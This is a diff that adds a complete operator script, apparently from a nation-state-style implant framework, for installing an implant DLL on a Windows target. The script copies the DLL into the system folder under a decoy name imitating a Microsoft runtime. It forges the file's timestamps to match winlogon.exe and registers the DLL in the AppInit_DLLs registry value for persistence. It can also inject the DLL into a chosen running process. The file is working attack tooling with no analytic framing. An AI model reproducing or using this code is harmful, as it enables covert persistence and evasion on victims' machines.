@@ -1,0 +1,153 @@
+
+@include "_Paths.dsi";
+@include "_Processes.dsi";
+@include "_Versions.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+@disablewow64 on;
+
+if ($argc != 3)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0] <localFile> <procName>");
+	return false;
+}
+
+string $localFile = $argv[1];
+string $procName = $argv[2];
+
+string $arch;
+_GetArch($arch);
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+# get the AppInit value
+string $origAppInitValue;
+if (!_GetRegistryValue("L", 
+					   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+					   "AppInit_DLLs",
+					   $origAppInitValue) || !defined($origAppInitValue))
+{
+	$origAppInitValue = "";
+}
+
+# get the process id for injection
+int $id;
+if (prompt("Do you want to perform injection (for instant-grat)?"))
+{
+	if (StrLen($procName) > 0)
+	{
+		if (!_FindProcessOnList($procName, $id) || !defined($id))
+		{
+			echo("* Failed to find $procName", ERROR);
+		}
+	}
+
+	# make sure the user wants to keep going if we don't have a process
+	if (!defined($id))
+	{
+		echo("No process for injection", ERROR);
+		if (!prompt("Continue?"))
+		{
+			return false;
+		}
+	}
+}
+	
+# get install name
+string $installName = "msvcp73.dll";
+if (!GetInput("PC DLL install name", $installName, $installName))
+{
+	echo("* Failed to get install name", ERROR);
+	return false;
+}
+
+string $newAppInitValue;
+if (StrLen($origAppInitValue) == 0)
+{
+	$newAppInitValue = $installName;
+}
+else
+{
+	$newAppInitValue = "$origAppInitValue $installName";
+}
+
+# upload the file
+echo "Uploading PC";
+if (!`put "$localFile" -name "$sysPath\\$installName" -permanent`)
+{
+	echo("    FAILED", ERROR);
+	pause;
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# matchtimes on the file
+string $matchName = "user.exe";
+if ($arch == "x64")
+{
+	$matchName = "winlogon.exe";
+}
+echo "Matching filetimes with $matchName";
+if (!`matchfiletimes -src "$sysPath\\$matchName" -dst "$sysPath\\$installName"`)
+{
+	echo("    FAILED", ERROR);
+	pause;
+	# continue...
+}
+else
+{
+	echo("    FINISHED", GOOD);
+}
+
+# update the registry key
+echo "Updating registry";
+if (!_SetRegistryValue("L", 
+					   "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+					   "AppInit_DLLs",
+					   $newAppInitValue,
+					   "REG_SZ"))
+{
+	echo("    FAILED", ERROR);
+	echo "Deleting PC";
+	if (!`delete -file "$sysPath\\$installName"`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    DELETED", GOOD);
+	}
+	pause;
+	return false;
+}
+echo("    SET", GOOD);
+
+if (defined($id))
+{
+	# inject the DLL
+	echo "Injecting DLL";
+	if (!`injectdll -library $installName -id $id`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    INJECTED", GOOD);
+	}
+}
+
+echo "Install Finished";
+echo "AppInit before : '$origAppInitValue'";
+echo " Appinit after : '$newAppInitValue'";
+
+pause;
+return true;
+
